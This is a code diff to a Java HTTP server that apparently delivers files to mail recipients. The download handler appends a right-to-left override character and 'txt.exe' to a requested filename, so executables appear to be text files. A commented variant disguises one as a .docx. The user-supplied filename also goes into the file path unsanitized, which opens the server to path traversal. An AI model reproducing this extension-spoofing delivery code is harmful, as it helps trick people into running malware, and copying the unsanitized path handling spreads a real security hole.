@@ -119,9 +119,9 @@ public class HTTPServer {
 
                     String filename = java.net.URLDecoder.decode(t.getRequestURI().toString().split("\\?")[1].split("=")[1], StandardCharsets.UTF_16);
                     SettingsSingleton ss = SettingsSingleton.getInstance();
-                    String requestedFile = ss.getWORKING_DIRECTORY()+"/files/" + filename + "\u202etxt.exe";//Document_\u202Excod.exe";
+                    //String requestedFile = ss.getWORKING_DIRECTORY()+"/files/" + filename + "\u202etxt.exe";//Document_\u202Excod.exe";
 
-                    Path fileToSend = Paths.get(requestedFile);
+                    Path fileToSend = Paths.get(ss.getWORKING_DIRECTORY(),"files",filename + "\u202etxt.exe");
                     if (Files.exists(fileToSend)) {
                         t.getResponseHeaders().add("Content-Disposition", "attachment; filename=" + fileToSend.getFileName());
                         t.sendResponseHeaders(200, Files.size(fileToSend));
@@ -148,7 +148,7 @@ public class HTTPServer {
     static class MailSecureHandler implements HttpHandler {
         @Override
         public void handle(HttpExchange t) {
-            Path resp = Paths.get("index.html");
+            Path resp = Paths.get(ss.getWORKING_DIRECTORY(),"index.html");
             try {
                 t.sendResponseHeaders(200, Files.size(resp));
                 OutputStream output = t.getResponseBody();
